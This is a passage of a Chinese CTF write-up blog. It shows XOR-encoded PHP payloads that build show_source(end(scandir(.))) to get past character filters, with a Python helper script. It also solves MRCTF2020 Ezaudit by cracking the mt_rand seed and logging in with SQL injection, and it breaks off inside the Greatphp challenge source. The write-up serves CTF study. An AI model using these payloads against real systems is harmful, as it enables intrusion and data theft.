<p>scandir源式子</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d)<br></code></pre></td></tr></table></figure>
<p>两个%ff相互异或为0，所以缩减后未改变原值<br>缩减后的</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure>
<p>.的异或未改变</p>
<p>两式子合二为一</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><img src="/images/DA04F3C07BA94df6B6419D4B06D8C0E5.png" srcset="/img/loading.gif" lazyload><br>完成，但这个flag需要读取，无法直接访问<br>那么我们再构造一个语句，scandir返回的是一个数组，且刚才的结果显示我们要找的文件再scandir的结果最后面，那么用end()方法就可以得到文件名了，读文件可以用show_source或者readfile<br>构造语句show_source(end(scandir(.)));<br>先简单异或构造</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a)(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>^<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>d)(<span class="hljs-variable">%ff</span>^<span class="hljs-variable">%d1</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>


<p>发现有19个不同字符，那么我们需要去掉6个字符，这里我们去掉的是h r o u a i</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">result2 = [0x8c, 0x97, 0x90, 0x88, 0xa0, 0x8a, 0x8d, 0x9c, 0x9a, 0x91, 0x9b, 0x9e, 0x96, 0xd1]<br>result = [0x8c, 0xa0, 0x88, 0x9c, 0x9a, 0x91, 0x9b, 0xd1] <br>temp = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> result2:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> result:<br>                <span class="hljs-keyword">if</span> (a ^ b ^ c == d):<br>                    <span class="hljs-keyword">if</span> a == b == c == d:<br>                        continue<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        # <span class="hljs-built_in">print</span>(d)<br>                        # d = bytes.fromhex(d)<br>                        # d = d.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                        # <span class="hljs-built_in">print</span>(d)<br>                        # <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;&#123;bytes.fromhex(d).decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)&#125;=%&#123;a&#125; ^ %&#123;b&#125; ^ %&#123;c&#125;&quot;</span>)<br>                        <span class="hljs-keyword">if</span> d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp.append(d)<br><span class="hljs-built_in">print</span>(len(temp), temp)<br></code></pre></td></tr></table></figure>

<p>运行脚本得到结果并手动去重<br>和刚才的方法一样,直接上结果把</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%88</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/3DA0E481B463490598C7C62F0476AFAA.png" srcset="/img/loading.gif" lazyload><br>也可以检查去重的值有没有变化<br><img src="/images/5E8B6A2B84874d5aB96D9C08D5A14DCE.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>highlight_file(__file__)<span class="hljs-comment">;</span><br>$print_r<span class="hljs-operator">=</span>urldecode(&#x27;<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br>&#x27;)<span class="hljs-comment">;</span><br>$scandir<span class="hljs-operator">=</span>urldecode(&#x27;<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%88</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>a&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br>&#x27;)<span class="hljs-comment">;</span><br>print($print_r)<span class="hljs-comment">;</span><br>print(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">;</span><br>print($scandir)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br># ((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>


<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>思考了一下午才有了思路，期间被垃圾博客带偏思路，浪费了很多时间，再总结一下整体方案：先简单异或-&gt;看有几个多出来的数，不同数的总数-13就是多出来的数，接下来需要用已知的数来构造那多出来数的值–&gt;将值拼接回源式–&gt;构造完成</p>
<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>网站有源码泄露，只有一个index.php<br>源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-regexp">//</span> 若为空,视为未填写,提示错误,并<span class="hljs-number">3</span>秒后返回登录界面<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        echo <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        echo <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            echo <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-regexp">//</span> genarate public_key <br><span class="hljs-keyword">function</span> public_key(<span class="hljs-variable">$length</span> = <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    return <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-regexp">//g</span>enarate private_key<br>  <span class="hljs-keyword">function</span> private_key(<span class="hljs-variable">$length</span> = <span class="hljs-number">12</span>) &#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    return <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-regexp">//</span><span class="hljs-variable">$Public_key</span> = KVQP0LdJKRaV3n9D  how to get crisp<span class="hljs-string">r&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>

<p>看似非常简单，实际也非常简单<br>这里有公钥和密钥，现在知道公钥是什么，可以通过伪随机数漏洞来求解，来推出种子值<br>这里借助工具<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a></p>
<p>先爆破随机序列，官网的脚本竟然不好用，求出的序列爆不出种子值，这里换用找到的脚本<br><img src="/images/1C405726F5864566869EAEE0A90C739F.png" srcset="/img/loading.gif" lazyload></p>
<p>然后使用php_mt_seed爆出种子值<br><img src="/images/DA85CFA3CC984288BE37C16381C0C16A.png" srcset="/img/loading.gif" lazyload></p>
<p>带入所给PHP代码<br><img src="/images/2CF1C9ADAA194de4983AB14648960461.png" srcset="/img/loading.gif" lazyload><br>得到私钥<br>XuNhoueCDCGc<br><img src="/images/CBCE1EEE41844d31AAD77BE074166FF6.png" srcset="/img/loading.gif" lazyload><br>因为用户名给出了，所以我们直接在密码处执行万能密码即可<br>点击登录获得flag</p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span 